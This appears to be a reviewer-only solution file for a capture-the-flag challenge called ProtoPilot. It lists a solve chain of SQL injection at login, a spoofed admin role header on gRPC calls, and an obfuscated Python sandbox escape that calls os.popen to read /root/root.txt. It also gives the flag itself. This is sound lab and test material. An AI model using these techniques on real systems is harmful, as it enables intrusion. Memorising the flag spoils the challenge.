# ProtoPilot Private Solution

This file is for reviewers and administrators only.
Do not publish this file as a player-facing attachment.

## Intended Solve Path

1. Visit `/team` and gather a valid internal email.
2. Use SQL injection in the password field on `POST /login` with a valid internal email.
3. Access `/dashboard` and extract operational context.
4. Inspect client-side source and discover the internal gRPC migration breadcrumb.
5. Retrieve `/static/protos/protopilot.proto`.
6. Call gRPC methods using `grpcurl` or generated client stubs.
7. Spoof `x-user-role: admin` metadata and invoke admin rule testing.
8. Use the weak sandbox implementation to read `/root/root.txt`.
9. Submit `SPIRIT{protopilot_root_eval_escape_91bd}`.

## Example Validation Commands

```bash
docker compose up --build -d
curl http://localhost:8081/static/protos/protopilot.proto -o protopilot.proto
grpcurl -plaintext localhost:50051 list
```

```bash
grpcurl -plaintext -proto protopilot.proto \
  -H 'x-user-role: admin' \
  -d '{"expression":"1+1"}' \
  localhost:50051 \
  protopilot.AdminService.TestRule
```

```bash
grpcurl -plaintext -proto protopilot.proto \
  -H 'x-user-role: admin' \
  -d '{"expression":"getattr(helper.__globals__[\"o\"+\"s\"],\"p\"+\"o\"+\"pen\")(\"cat /r\"+\"oot/r\"+\"oot.txt\").__iter__().__next__()"}' \
  localhost:50051 \
  protopilot.AdminService.TestRule
```

Expected result: response includes the canonical root flag value from `/root/root.txt`.

## Reset

```bash
./deploy/reset.sh
```

## Reviewer Notes

- Canonical submission flag is the root flag only.
- The user-facing dashboard token is an intermediate clue, not the canonical flag.
- Use `private_solutions/solve_dast.py` for internal full-chain verification.
